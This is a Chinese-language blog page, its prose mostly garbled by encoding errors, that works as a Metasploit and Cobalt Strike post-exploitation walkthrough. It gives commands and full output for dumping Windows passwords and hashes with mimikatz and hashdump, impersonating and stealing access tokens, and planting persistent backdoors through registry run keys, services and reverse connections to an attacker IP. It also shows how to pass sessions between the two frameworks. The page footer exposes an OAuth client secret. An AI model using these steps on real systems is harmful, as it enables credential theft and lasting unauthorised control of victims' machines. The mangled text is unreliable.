<h3 id="è·å–å‡­è¯"><a href="#è·å–å‡­è¯" class="headerlink" title="è·å–å‡­è¯"></a>è·å–å‡­è¯</h3><p>åœ¨å†…ç½‘ç¯å¢ƒä¸­ï¼Œä¸€ä¸ªç®¡ç†å‘˜å¯èƒ½ç®¡ç†å¤šå°æœåŠ¡å™¨ï¼Œä»–ä½¿ç”¨çš„å¯†ç æœ‰å¯èƒ½ç›¸åŒæˆ–è€…æœ‰è§„å¾‹ï¼Œå¦‚æœèƒ½å¤Ÿå¾—åˆ°å¯†ç æˆ–è€…hashï¼Œå†å°è¯•ç™»å½•å†…ç½‘å…¶å®ƒæœåŠ¡å™¨ï¼Œå¯èƒ½å–å¾—æ„æƒ³ä¸åˆ°çš„æ•ˆæœã€‚</p>
<p>1.ä½¿ç”¨mimikatz</p>
<pre><code class="bash">load mimikatz    #help mimikatz æŸ¥çœ‹å¸®åŠ©
wdigest  #è·å–Wdigestå¯†ç 
mimikatz_command -f samdump::hashes  #æ‰§è¡ŒmimikatzåŸå§‹å‘½ä»¤
mimikatz_command -f sekurlsa::searchPasswords

# ç¤ºä¾‹
meterpreter &gt; load mimikatz
Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#39;load kiwi&#39; instead?
Success.
meterpreter &gt; wdigest
[!] Not currently running as SYSTEM
[*] Attempting to getprivs ...
[+] Got SeDebugPrivilege.
[*] Retrieving wdigest credentials
wdigest credentials
===================

AuthID    Package    Domain        User           Password
------    -------    ------        ----           --------
0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  
0;996     Negotiate  WORKGROUP     SAUCERMAN$     
0;48748   NTLM                                    
0;999     NTLM       WORKGROUP     SAUCERMAN$     
0;476238  NTLM       SAUCERMAN     TideSec        123456
0;476209  NTLM       SAUCERMAN     TideSec        123456

meterpreter &gt; mimikatz_command -f samdump::hashes
Ordinateur : saucerman
BootKey    : 691cff33caf49e933be97fcee370256a
RegOpenKeyEx SAM : (0x00000005) ï¿½İ¿ï¿½ 
Erreur lors de l&#39;exploration du registre
meterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords
[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;
[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;
[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;
[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;
[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;
[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;
</code></pre>
<ol>
<li>ä½¿ç”¨meterpreterçš„run hashdumpå‘½ä»¤</li>
</ol>
<pre><code class="bash">meterpreter &gt; run hashdump

[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.
[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...
/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated
/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated
/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated
[*] Dumping password hints...

TideSec:&quot;123456&quot;

[*] Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
</code></pre>
<p>3.post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump</p>
<p>ä»ä¸Šé¢ä¹Ÿå¯ä»¥çœ‹å‡ºå®˜æ–¹æ¨è<code>post/windows/gather/smart_hashdump</code></p>
<pre><code class="bash">meterpreter &gt; run post/windows/gather/smart_hashdump

[*] Running module against SAUCERMAN
[*] Hashes will be saved to the database if one is connected.
[+] Hashes will be saved in loot in JtR password file format to:
[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt
[*] Dumping password hashes...
[*] Running as SYSTEM extracting hashes from registry
[*]     Obtaining the boot key...
[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...
[*]     Obtaining the user list and keys...
[*]     Decrypting user keys...
[*]     Dumping password hints...
[+]     TideSec:&quot;123456&quot;
[*]     Dumping password hashes...
[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
</code></pre>
<p>4.powerdump<br>åŒ hashdumpï¼Œä½†å¤±è´¥äº†</p>
<pre><code class="bash">meterpreter &gt; run powerdump
[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...
[*] Running PowerDump to extract Username and Password Hashes...
[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...
[*] Setting ExecutionPolicy to Unrestricted...
[*] Dumping the SAM database through PowerShell...

[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.
</code></pre>
<h3 id="å‡å†’ä»¤ç‰Œ"><a href="#å‡å†’ä»¤ç‰Œ" class="headerlink" title="å‡å†’ä»¤ç‰Œ"></a>å‡å†’ä»¤ç‰Œ</h3><p>åœ¨ç”¨æˆ·ç™»å½•windowsæ“ä½œç³»ç»Ÿæ—¶ï¼Œç³»ç»Ÿéƒ½ä¼šç»™ç”¨æˆ·åˆ†é…ä¸€ä¸ªä»¤ç‰Œ(Token)ï¼Œå½“ç”¨æˆ·è®¿é—®ç³»ç»Ÿèµ„æºæ—¶éƒ½ä¼šä½¿ç”¨è¿™ä¸ªä»¤ç‰Œè¿›è¡Œèº«ä»½éªŒè¯ï¼ŒåŠŸèƒ½ç±»ä¼¼äºç½‘ç«™çš„sessionæˆ–è€…cookieã€‚</p>
<p>msfæä¾›äº†ä¸€ä¸ªåŠŸèƒ½æ¨¡å—å¯ä»¥è®©æˆ‘ä»¬å‡å†’åˆ«äººçš„ä»¤ç‰Œï¼Œå®ç°èº«ä»½åˆ‡æ¢ï¼Œå¦‚æœç›®æ ‡ç¯å¢ƒæ˜¯åŸŸç¯å¢ƒï¼Œåˆšå¥½åŸŸç®¡ç†å‘˜ç™»å½•è¿‡æˆ‘ä»¬å·²ç»æœ‰æƒé™çš„ç»ˆç«¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å‡å†’æˆåŸŸç®¡ç†å‘˜çš„è§’è‰²ã€‚</p>
<pre><code class="bash"># 1.incognitoå‡å†’ä»¤ç‰Œ
use incognito      #help incognito  æŸ¥çœ‹å¸®åŠ©
list_tokens -u    #æŸ¥çœ‹å¯ç”¨çš„token
impersonate_token &#39;NT AUTHORITY\SYSTEM&#39;  #å‡å†’SYSTEM token
æˆ–è€…impersonate_token NT\ AUTHORITY\\SYSTEM #ä¸åŠ å•å¼•å· éœ€ä½¿ç”¨\\
execute -f cmd.exe -i â€“t    # -t ä½¿ç”¨å‡å†’çš„token æ‰§è¡Œ
æˆ–è€…ç›´æ¥shell
rev2self   #è¿”å›åŸå§‹token

# 2.steal_tokençªƒå–ä»¤ç‰Œ
steal_token &lt;pidå€¼&gt;   #ä»æŒ‡å®šè¿›ç¨‹ä¸­çªƒå–token   å…ˆps,æ‰¾åŸŸæ§è¿›ç¨‹
drop_token  #åˆ é™¤çªƒå–çš„token
</code></pre>
<h3 id="æ¤å…¥åé—¨"><a href="#æ¤å…¥åé—¨" class="headerlink" title="æ¤å…¥åé—¨"></a>æ¤å…¥åé—¨</h3><p>Meterpreterä»…ä»…æ˜¯åœ¨å†…å­˜ä¸­é©»ç•™çš„Shellcodeï¼Œåªè¦ç›®æ ‡æœºå™¨é‡å¯å°±ä¼šä¸§å¤±æ§åˆ¶æƒï¼Œä¸‹é¢å°±ä»‹ç»å¦‚ä½•æ¤å…¥åé—¨ï¼Œç»´æŒæ§åˆ¶ã€‚</p>
<p>1.persistenceå¯åŠ¨é¡¹åé—¨</p>
<p>è·¯å¾„ï¼šmetasploit&#x2F;scripts&#x2F;meterpreter&#x2F;persistence</p>
<p>åŸç†æ˜¯åœ¨<code>C:\Users***\AppData\Local\Temp\</code>ç›®å½•ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ªvbsè„šæœ¬ï¼Œåœ¨æ³¨å†Œè¡¨<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>åŠ å…¥å¼€æœºå¯åŠ¨é¡¹ï¼Œ<strong>å¾ˆå®¹æ˜“è¢«æ€è½¯æ‹¦æˆªï¼Œå®˜æ–¹ä¸æ¨è</strong></p>
<pre><code class="bash">run persistence â€“h  #æŸ¥çœ‹å¸®åŠ©
run persistence -X -i 5 -p 4444 -r 192.168.81.160
#-XæŒ‡å®šå¯åŠ¨çš„æ–¹å¼ä¸ºå¼€æœºè‡ªå¯åŠ¨ï¼Œ-iåå‘è¿æ¥çš„æ—¶é—´é—´éš”(5s) â€“r æŒ‡å®šæ”»å‡»è€…çš„ip
# ç¤ºä¾‹
meterpreter &gt; run persistence -X -i 5 -p 4444 -r 192.168.81.160

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
[*] Running Persistence Script
[*] Resource file for cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.81.160 LPORT=4444
[*] Persistent agent script is 99630 bytes long
[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs
[*] Executing script C:\Users\TideSec\AppData\Local\Temp\qexwcMF.vbs
[+] Agent executed with PID 3540
[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua
[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\qrsXZuPqVbEgua
</code></pre>
<p>èƒ½å®ç°åŒæ ·åŠŸèƒ½çš„è„šæœ¬è¿˜æœ‰ï¼šexploit&#x2F;windows&#x2F;local&#x2F;persistence</p>
<p>2.metsvcæœåŠ¡åé—¨</p>
<p>åœ¨C:\Users<em><strong>\AppData\Local\Temp\ç›®å½•ä¸‹ï¼Œä¸Šä¼ ä¸€ä¸ªvbsè„šæœ¬<br>åœ¨æ³¨å†Œè¡¨HKLM\Software\Microsoft\Windows\CurrentVersion\Run\åŠ å…¥å¼€æœºå¯åŠ¨é¡¹ã€‚</strong>é€šè¿‡æœåŠ¡å¯åŠ¨ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œå®˜æ–¹ä¸æ¨èä½¿ç”¨ï¼Œè¿è¡Œå¤±è´¥</em>*</p>
<pre><code class="bash">run metsvc â€“A   #è‡ªåŠ¨å®‰è£…åé—¨

# ç¤ºä¾‹
meterpreter &gt; run metsvc â€“A

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
[*] Creating a meterpreter service on port 31337
[*] Creating a temporary installation directory C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH...
[*]  &gt;&gt; Uploading metsrv.x86.dll...
[*]  &gt;&gt; Uploading metsvc-server.exe...
[*]  &gt;&gt; Uploading metsvc.exe...
[*] Starting the service...
    Cannot open service manager (0x00000005)

meterpreter &gt; ls
Listing: C:\Users\TideSec\AppData\Local\Temp\iInvhjKZbLH
========================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100666/rw-rw-rw-  178688  fil   2019-06-12 06:46:20 -0700  metsrv.dll
100777/rwxrwxrwx  45056   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe
100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe
</code></pre>
<p>ä¸‰ä¸ªæ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œä½†æœåŠ¡æ²¡æœ‰å¯åŠ¨èµ·æ¥ï¼Œå¤±è´¥äº†ã€‚ä½¿ç”¨<code>-r</code>å‚æ•°å¯å¸è½½æœåŠ¡ã€‚</p>
<p>3.persistence_exe</p>
<p>å†æ¥çœ‹çœ‹å®˜æ–¹æ¨èçš„ä¸œè¥¿å§</p>
<pre><code class="bash">meterpreter &gt; info post/windows/manage/persistence_exe

       Name: Windows Manage Persistent EXE Payload Installer
     Module: post/windows/manage/persistence_exe
   Platform: Windows
       Arch: 
       Rank: Normal

Provided by:
  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;

Compatible session types:
  Meterpreter

Basic options:
  Name      Current Setting  Required  Description
  ----      ---------------  --------  -----------
  REXENAME  default.exe      yes       The name to call exe on remote system
  REXEPATH                   yes       The remote executable to upload and execute.
  SESSION                    yes       The session to run this module on.
  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)

Description:
  This Module will upload an executable to a remote host and make it 
  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER 
  will start on user login, SYSTEM will start on system boot but 
  requires privs. SERVICE will create a new service which will start 
  the payload. Again requires privs.



Module options (post/windows/manage/persistence_exe):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   REXENAME  default.exe      yes       The name to call exe on remote system
   REXEPATH                   yes       The remote executable to upload and execute.
   SESSION                    yes       The session to run this module on.
   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)
</code></pre>
<p>æ­¤æ¨¡å—å°†å¯æ‰§è¡Œæ–‡ä»¶ä¸Šè½½åˆ°è¿œç¨‹ä¸»æœºå¹¶è¿›è¡Œåˆ›å»ºæŒä¹…æ€§ã€‚<br>æ¶‰åŠåˆ°å››ä¸ªå‚æ•°</p>
<ul>
<li>REXENAMEæ˜¯æ‹·è´åˆ°ç›®æ ‡ç³»ç»Ÿä¸­çš„åå­—</li>
<li>EXEPATHæ˜¯å°†è¦ä¸Šä¼ çš„åé—¨åœ¨æœ¬åœ°çš„ä½ç½®</li>
<li>SESSIONæ˜¯é€‰æ‹©è¿è¡Œæ­¤æ¨¡å—çš„ä¼šè¯</li>
<li>STARTUPæ˜¯å¯åŠ¨ç±»å‹ï¼Œæœ‰USERã€SYSTEMã€SERVICEè¿™ä¸‰ç§å–å€¼ï¼ŒUSERè¡¨ç¤ºä¸ºå°†åœ¨ç”¨æˆ·ç™»å½•æ—¶å¯åŠ¨ï¼ŒSYSTEMè¡¨ç¤ºå°†åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶å¯åŠ¨(éœ€è¦æƒé™)ï¼ŒSERVICEè¡¨ç¤ºå°†åˆ›å»ºä¸€ä¸ªå¯åŠ¨æœåŠ¡é¡¹(éœ€è¦æƒé™)ã€‚</li>
</ul>
<p>å°è¯•ä¸€ä¸‹ï¼š</p>
<pre><code class="bash">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER

[*] Running module against SAUCERMAN
[*] Reading Payload from file /home/ubuntu/shell.exe
[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe
[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe
[+] Agent executed with PID 3684
[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI
[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI
[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc
</code></pre>
<p>4.registry_persistence</p>
<p>å®Œæ•´è·¯å¾„ä¸ºexploit&#x2F;windows&#x2F;local&#x2F;registry_persistence</p>
<p>å’Œç¬¬ä¸€ç§æ–¹æ³•ç±»ä¼¼ï¼Œæ­¤æ¨¡å—å°†ä¼šå®‰è£…ä¸€ä¸ªpayloadåˆ°æ³¨å†Œè¡¨çš„å¯åŠ¨é¡¹ä¸­ã€‚</p>
<pre><code class="bash">meterpreter &gt; background
[*] Backgrounding session 13...
msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence
msf5 exploit(windows/local/registry_persistence) &gt; show options

Module options (exploit/windows/local/registry_persistence):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)
   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)
   CREATE_RC      true             no        Create a resource file for cleanup
   RUN_NAME                        no        The name to use for the &#39;Run&#39; key. (Default: random)
   SESSION                         yes       The session to run this module on.
   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)
   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13
SESSION =&gt; 13
msf5 exploit(windows/local/registry_persistence) &gt; run

[*] Generating payload blob..
[+] Generated payload, 6048 bytes
[*] Root path is HKCU
[*] Installing payload blob..
[+] Created registry key HKCU\Software\0BaG3zDR
[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD
[*] Installing run key
[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB
[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc
</code></pre>
<p>åŒç±»å‹çš„è¿˜æœ‰å…¶ä»–payloadï¼Œå¦‚exploit&#x2F;windows&#x2F;local&#x2F;vss_persistenceï¼Œexploit&#x2F;windows&#x2F;local&#x2F;s4u_persistenceã€‚</p>
<h1 id="cså¤§å…¨"><a href="#cså¤§å…¨" class="headerlink" title="cså¤§å…¨"></a>cså¤§å…¨</h1><p>csæ´¾ç”Ÿmsf</p>
<pre><code class="bash">msf &gt; use exploit/multi/handler 
msf exploit(handler) &gt; set payload windows/meterpreter/reverse_http
msf exploit(handler) &gt; set lhost 192.168.0.143
msf exploit(handler) &gt; set lport 4444
msf exploit(handler) &gt; exploit

csåˆ›å»ºä¸€ä¸ªwindows/foreign/reverse_httpçš„ Listener
ç„¶åé€‰ä¸­å¯¹åº”æœºå™¨ï¼Œå³é”®-&gt;Spawnï¼Œé€‰æ‹©åˆšåˆšåˆ›å»ºçš„ç›‘å¬å™¨ã€‚
</code></pre>
<p>msf æ´¾ç”Ÿ cs</p>
<pre><code class="bash">use exploit/windows/local/payload_inject 
ä½¿ç”¨è¯¥æ¨¡å—å¯ä»¥å°† Metasploit è·å–åˆ°çš„ä¼šè¯æ³¨å…¥åˆ°CSä¸­
set DisablePayloadHandler true 
ç”¨æ¥ç¦ç”¨ Metasploit payload handlerçš„ç›‘å¬ å› ä¸ºè¦ç›‘å¬åˆ°csä¸Š
set lhost xxx CSIP
set lport 7869 CSä¸Šçš„listenç«¯å£
set session 10 è¦è½¬å‘çš„session
</code></pre>

      
       <hr><span style="font-style: italic;color: gray;"> è½¬è½½è¯·æ³¨æ˜æ¥æºï¼Œæ¬¢è¿å¯¹æ–‡ç« ä¸­çš„å¼•ç”¨æ¥æºè¿›è¡Œè€ƒè¯ï¼Œæ¬¢è¿æŒ‡å‡ºä»»ä½•æœ‰é”™è¯¯æˆ–ä¸å¤Ÿæ¸…æ™°çš„è¡¨è¾¾ã€‚ä¸æˆ‘è”ç³»email c2VjaW5mby5tQGdtYWlsLmNvbQo= </span>
    </div>
</article>





    <div id="comments"></div>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">

<script type="text/javascript">
    $.getScript('/js/gitalk.js', function () {
        var gitalk = new Gitalk({
            clientID: 'Ov23liCI7IivDMb6MVcG',
            clientSecret: 'ea5df48e486b428ada9d960888e31b0d54a11ce8',
            repo: '0x404ming.github.io',
            owner: '0x404Ming',
            admin: ['0x404Ming'],
            id: decodeURI(location.pathname),
            distractionFreeMode: 'true',
            language: 'zh-CN',
            perPage: parseInt('10',10)
        })
        gitalk.render('comments')
    })
</script>




    




    </div>
    <div class="copyright">
        <p class="footer-entry">
    Â©2018-2024 0x404ming
</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full" data-title="Toggle full screen shortcut key s"><span class="min "></span></button>
<a class="" id="rocket" ></a>

    </div>
</div>

</body>
<script src="/js/jquery.pjax.js?v=1.1.0" ></script>

<script src="/js/script.js?v=1.1.0" ></script>
<script>
    var img_resize = 'default';
    function initArticle() {
        /*æ¸²æŸ“å¯¹åº”çš„è¡¨æ ¼æ ·å¼*/
        
            $("#post .pjax table").addClass("green_title");
        

        /*æ¸²æŸ“æ‰“èµæ ·å¼*/
        

        /*é«˜äº®ä»£ç å—è¡Œå·*/
        

        /*è®¿é—®æ•°é‡*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*ä»£ç é«˜äº®ï¼Œè¡Œå·å¯¹é½*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*æ‰“èµé¡µé¢éšè—ä¸å±•ç¤º*/
    

</script>

<!--åŠ å…¥è¡Œå·çš„é«˜äº®ä»£ç å—æ ·å¼-->

<!--è‡ªå®šä¹‰æ ·å¼è®¾ç½®-->
<style>
    
    
    .nav {
        width: 560px;
    }
    .nav.fullscreen {
        margin-left: -560px;
    }
    .nav-left {
        width: 138px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*åˆ—è¡¨æ ·å¼*/
    

    /* èƒŒæ™¯å›¾æ ·å¼ */
    
    


    /*å¼•ç”¨å—æ ·å¼*/
    

    /*æ–‡ç« åˆ—è¡¨èƒŒæ™¯å›¾*/
    

    
</style>







</html>
